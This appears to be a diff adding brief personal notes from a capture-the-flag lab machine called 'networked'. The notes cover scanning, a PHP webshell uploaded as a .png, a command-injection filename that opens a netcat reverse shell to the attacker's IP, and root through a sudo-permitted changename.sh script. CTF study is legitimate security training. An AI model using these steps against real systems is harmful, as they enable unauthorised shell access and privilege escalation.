@@ -1,0 +1,45 @@
+nmap -sC -sV 10.10.10.146
+
+dib http://10.10.10.146
+found /backup
+downloaded and got the files of the website!
+
+(10.10.12.221)
+
+/upload.php
+[DONE] php webshell to bypass img verif (see code upload.php)
+shell.php.png -> downloaded from pentestmonkey ip:10.10.xx.xxx/port: 9999
+payload: nc -nlvp 9999
+
+User shell:
+execute reverse shell here, the file name has to be different from an IP
+SHELLCODE MUST BE THE NAME OF THE FILE!
+
+ip a s tun0
+nc -nlvp 8080
+
+cd /var/www/html/uploads/
+> "; nc -c bash 10.10.12.221 8080;"
+
+GOT USER!
+
+ROOT
+
+sudo -l 
+User guly may run the following commands on networked:
+    	(root) NOPASSWD: /usr/local/sbin/changename.sh
+
+cat changename.sh
+(see: https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
+
+cd /usr/local/sbin/
+sudo ./changename.sh
+
+type "network bash" x4
+
+!ROOT!
+
+
+
+
+
